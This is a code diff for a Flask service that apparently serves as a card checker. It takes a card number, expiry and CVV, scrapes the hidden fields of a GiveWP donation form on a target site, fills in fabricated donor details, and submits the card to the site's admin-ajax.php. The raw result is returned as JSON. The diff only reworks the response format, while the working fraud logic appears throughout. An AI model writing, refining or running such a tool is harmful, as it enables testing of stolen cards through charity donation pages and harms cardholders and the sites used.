@@ -1,4 +1,4 @@
-from flask import Flask, request, Response
+from flask import Flask, request, jsonify
 import requests
 from bs4 import BeautifulSoup
 import random
@@ -28,27 +28,22 @@ def check():
     amount = request.args.get("amount")
 
     if not url or not card or not amount:
-        return Response("Missing params", status=400)
+        return jsonify({"result": "Missing params"}), 400
 
     try:
         number, month, year, cvv = card.split("|")
 
         session = requests.Session()
-
         headers = get_headers(url)
 
-        # 🔁 retry بسيط
         for attempt in range(2):
             try:
-                # 1️⃣ فتح الصفحة
                 page = session.get(url, headers=headers, timeout=15)
-
                 soup = BeautifulSoup(page.text, "html.parser")
 
                 form_id = soup.find("input", {"name": "give-form-id"}).get("value")
                 form_hash = soup.find("input", {"name": "give-form-hash"}).get("value")
 
-                # 2️⃣ بيانات dynamic
                 email = f"user{random.randint(1000,9999)}@mail.com"
 
                 payload = {
@@ -56,17 +51,14 @@ def check():
                     "give-form-id": form_id,
                     "give-form-hash": form_hash,
                     "give-amount": amount,
-
                     "give_first": "John",
                     "give_last": "Doe",
                     "give_email": email,
-
                     "give_address_1": "Street 1",
                     "give_city": "NY",
                     "give_state": "NY",
                     "give_zip": "10001",
                     "give_country": "US",
-
                     "card_number": number,
                     "card_exp_month": month,
                     "card_exp_year": year,
@@ -74,28 +66,17 @@ def check():
                 }
 
                 ajax_url = url.split("/give")[0] + "/wp-admin/admin-ajax.php"
+                resp = session.post(ajax_url, data=payload, headers=headers, timeout=15)
 
-                resp = session.post(
-                    ajax_url,
-                    data=payload,
-                    headers=headers,
-                    timeout=15
-                )
-
-                # 🔥 رجّع الرد الخام
-                return Response(
-                    resp.text,
-                    content_type=resp.headers.get("Content-Type", "text/plain")
-                )
+                return jsonify({"result": resp.text[:500]})  # JSON دايمًا
 
             except Exception:
                 time.sleep(1)
 
-        return Response("Request failed after retry", status=500)
+        return jsonify({"result": "Request failed after retry"}), 500
 
     except Exception as e:
-        return Response(str(e), status=500)
-
+        return jsonify({"result": str(e)}), 500
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
